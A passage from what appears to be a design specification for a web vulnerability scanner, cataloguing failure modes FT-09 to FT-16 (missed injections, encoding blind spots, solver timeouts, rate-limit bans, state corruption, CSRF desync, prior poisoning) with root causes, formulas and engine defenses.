- **Engine Defense:** Out-of-Band (OAST) Listener Correlation with cryptographic token attestation and multi-step stateful session polling.

#### FT-09: Sub-Threshold Multi-Bit Boolean Modulation (Micro-Deltas)
- **Category:** False Negative (FN) | **Severity:** HIGH
- **Architectural Root Cause:** Boolean injection modifying only a single whitespace character, CSS class, or HTTP ETag hash, which falls below coarse threshold diffing engines.
- **Mathematical Model:** $\Delta \text{Size} = 1\text{ byte} < \tau_{\text{threshold}} \implies$ discarded as noise.
- **Blast Radius:** Silent extraction flaws in modern Single Page Applications missed.
- **Engine Defense:** 1-Bit DOM AST Differential Oracles with exact element attribute hashing and ETag header monitoring.

#### FT-10: Strict Layered Encoding & Non-Standard Marshalling Bypasses
- **Category:** False Negative (FN) | **Severity:** HIGH
- **Architectural Root Cause:** Parameters wrapped in multi-layered containers (Base64 inside JSON inside URL encoding) which scanner fuzzers fail to deconstruct and re-encode.
- **Mathematical Model:** Probe $P$ injected at raw layer breaks outer JSON parser, triggering 400 Bad Request.
- **Blast Radius:** REST and GraphQL APIs using encrypted or encoded tokens completely bypassed.
- **Engine Defense:** Multi-Layer Codec Pipeline applying recursive encoding transforms during AST probe synthesis.

---

### 19.3 Domain 3: Reliability & Resource Failure Modes (FT-11 to FT-13)

#### FT-11: Pathological SMT Constraint Solver Timeout / State Explosion
- **Category:** Reliability / Resource | **Severity:** HIGH
- **Architectural Root Cause:** Solving non-linear string constraints with regex replacement and base64 arithmetic triggering exponential backtracking in Z3 ($T > 5\text{s}$).
- **Mathematical Model:** $T_{\text{solve}} = \mathcal{O}(2^{N \cdot k}) \to \infty$.
- **Blast Radius:** Scanner CPU starvation, worker thread lockup, and stalled scan pipelines.
- **Engine Defense:** Strict Bounded SMT Solver Fuel (100,000 steps / $500\text{ms}$ timeout) with automatic fallback to probabilistic grammar synthesis.

#### FT-12: High-Jitter Variance Network Starvation & False Timeout
- **Category:** Reliability / Resource | **Severity:** MEDIUM
- **Architectural Root Cause:** Heavy-tailed network latency distributions (Pareto $\alpha < 2$) causing random network delays to be misinterpreted as server timeouts or lost packets.
- **Mathematical Model:** Network variance $\text{Var}[X] = \infty$; fixed timeout $T_{\text{timeout}} = 2000\text{ms}$ drops valid responses.
- **Blast Radius:** Excessive retransmissions, scan budget exhaustion, and aborted tests.
- **Engine Defense:** Adaptive EWMA Network Timeout Estimator with Wald's SPRT for robust hypothesis testing under heavy-tailed jitter.

#### FT-13: Scan-Induced WAF IP Blacklisting & Behavioral Rate Limiting
- **Category:** Reliability / Resource | **Severity:** CRITICAL
- **Architectural Root Cause:** High-frequency burst probing (e.g. twin-channel shadowing) depleting edge token buckets and triggering IP bans early in the engagement.
- **Mathematical Model:** $\sum c_i > \beta + \rho t \implies$ Edge returns 429 / 403 on all subsequent requests.
- **Blast Radius:** 100% False Negatives across all remaining endpoints in scan scope.
- **Engine Defense:** Token Bucket Rate Governor with Adaptive Backoff, Jittered Request Scheduling, and 429 Early-Warning Detection.

---

### 19.4 Domain 4: Statefulness & Integrity Failure Modes (FT-14 to FT-16)

#### FT-14: Concurrency Race & State Pollution in Differential Shadowing
- **Category:** Statefulness / Integrity | **Severity:** CRITICAL
- **Architectural Root Cause:** Dispatching concurrent twin requests against data-mutating endpoints (`UPDATE`, `DELETE`, `INSERT`), causing $R_{\text{probe}}$ to destroy records before $R_{\text{control}}$ executes.
- **Mathematical Model:** $R_{\text{probe}}$ mutates state $\mathcal{S}_0 \to \mathcal{S}_1$; $R_{\text{control}}$ observes $\mathcal{S}_1 \ne \mathcal{S}_0 \implies \Delta G \gg \tau$ (False Positive) + Production Data Lost!
- **Blast Radius:** Permanent corruption of client databases, session destruction, and false positive alerts.
- **Engine Defense:** Strict Read-Only Pre-Flight Verification (disallowing twin concurrency on DML/DDL sinks) and Ephemeral Transaction Rollback Sandboxing.

#### FT-15: Anti-CSRF / Nonce Session Desynchronization & Invalidation
- **Category:** Statefulness / Integrity | **Severity:** MEDIUM
- **Architectural Root Cause:** Scanner executing probes that consume one-time Anti-CSRF tokens without updating the virtual cookie jar, causing subsequent requests to fail with HTTP 403.
- **Mathematical Model:** Token $\text{CSRF}_t$ burned; server rejects $\text{CSRF}_t$ on step $t+1$.
- **Blast Radius:** Scanner loses authenticated session state and tests unauthenticated error pages.
- **Engine Defense:** Virtual Session Jar with Automated Token Extraction and Dynamic Re-Authentication Hooks.

#### FT-16: Active Learning Likelihood Surface Trapping via Feedback Poisoning
- **Category:** Model / Active Learning | **Severity:** HIGH
- **Architectural Root Cause:** Adaptive WAF returning crafted response sequences that bias the Dirichlet-Categorical context prior $\text{Dir}(\boldsymbol{\alpha})$, collapsing exploration.
- **Mathematical Model:** $\alpha_{\text{INTEGER}} \gg \sum \alpha_j \implies P_0(\theta = \text{INTEGER}) \to 0.99$.
- **Blast Radius:** Scanner exhausts request budget on wrong parameter context, missing genuine string injections.
- **Engine Defense:** Dirichlet Prior Regularization with Maximum Entropy Exploration Floor (ensuring $\min P(\theta_k) \ge \epsilon > 0$).

---

*This concludes the Master Benchmark Laboratory, Ground-Truth Corpora, Quantitative Metrics & Systemic Failure Taxonomy Specification.*
